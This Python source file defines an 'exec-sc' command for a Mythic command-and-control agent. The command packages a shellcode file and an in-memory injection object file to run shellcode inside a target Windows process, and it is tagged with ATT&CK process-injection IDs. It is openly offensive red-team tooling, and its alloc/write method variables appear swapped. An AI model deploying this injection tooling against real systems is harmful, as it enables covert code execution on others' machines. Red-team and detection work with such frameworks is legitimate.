from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import base64

from .Utils.u import *

class ExecScArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="file",
                cli_name="file",
                type=ParameterType.File,
                description="Shellcode file ID in Mythic to inject",
                parameter_group_info=[ParameterGroupInfo(required=True)]
            ),
            CommandParameter(
                name="pid",
                cli_name="pid",
                type=ParameterType.Number,
                description="Process ID to inject into (optional)",
                default_value=0,
                parameter_group_info=[ParameterGroupInfo(required=False)]
            ),
            CommandParameter(
                name="args",
                cli_name="args",
                type=ParameterType.String,
                description="Arguments for shellcode execution (optional)",
                parameter_group_info=[ParameterGroupInfo(required=False)]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Arguments required")
            
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            parts = self.command_line.split()
            if len(parts) < 1:
                raise ValueError("Usage: exec-sc -file <file_id> -pid [pid] -args [args]")
            
            self.add_arg("file", parts[0])
            
            if len(parts) > 1 and parts[1].isdigit():
                self.add_arg("pid", int(parts[1]))
                if len(parts) > 2:
                    self.add_arg("args", " ".join(parts[2:]))
            elif len(parts) > 1:
                self.add_arg("args", " ".join(parts[1:]))

class ExecScCommand(CommandBase):
    cmd = "exec-sc"
    needs_admin = False
    help_cmd = "exec-sc <file_id> [pid] [args]"
    description = "Execute shellcode in memory"
    version = 1
    author = "@Oblivion"
    attackmapping = ["T1055", "T1064"]
    argument_class = ExecScArguments
    browser_script = BrowserScript(script_name="usf_new", author="@Oblivion", for_new_ui=True)
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(self, task: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        file_name = task.args.get_arg("file")
        pid       = task.args.get_arg("pid")
        args      = task.args.get_arg("args")
        
        bof_content = await get_content_by_name("kh_exec-sc.x64.o", task.Task.ID)
        sc_content  = await get_content_by_name( file_name, task.Task.ID)
            
        output  = f"Executing shellcode file: {file_name}"
        display = f"-file {file_name}"

        if pid > 0:
            display += f" -pid {pid}"
        if args:
            display += f" -args {args}"
        
        task.args.remove_arg("file")
        task.args.remove_arg("pid")
        task.args.remove_arg("args")
    
        AgentData = StorageExtract( task.Callback.AgentCallbackID )

        alloc_type = AgentData["injection"]["write_method"]
        write_type = AgentData["injection"]["alloc_method"]

        bof_args = [
            {"type": "bytes", "value": sc_content.hex()},
            {"type": "int"  , "value": pid},
            {"type": "char" , "value": args},            
            {"type": "int"  , "value": alloc_type},       
            {"type": "int"  , "value": write_type},
        ]

        task.args.add_arg("bof_file", bof_content.hex())
        task.args.add_arg("bof_id", 0, ParameterType.Number)
        task.args.add_arg("bof_args", json.dumps(bof_args))

        return PTTaskCreateTaskingMessageResponse(
            TaskID=task.Task.ID,
            DisplayParams=f"-file {file_name}"
        )

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        if not response:
            return PTTaskProcessResponseMessageResponse(
                TaskID=task.Task.ID,
                Success=True
            )

        return PTTaskProcessResponseMessageResponse(
            TaskID=task.Task.ID,
            Success=True
        )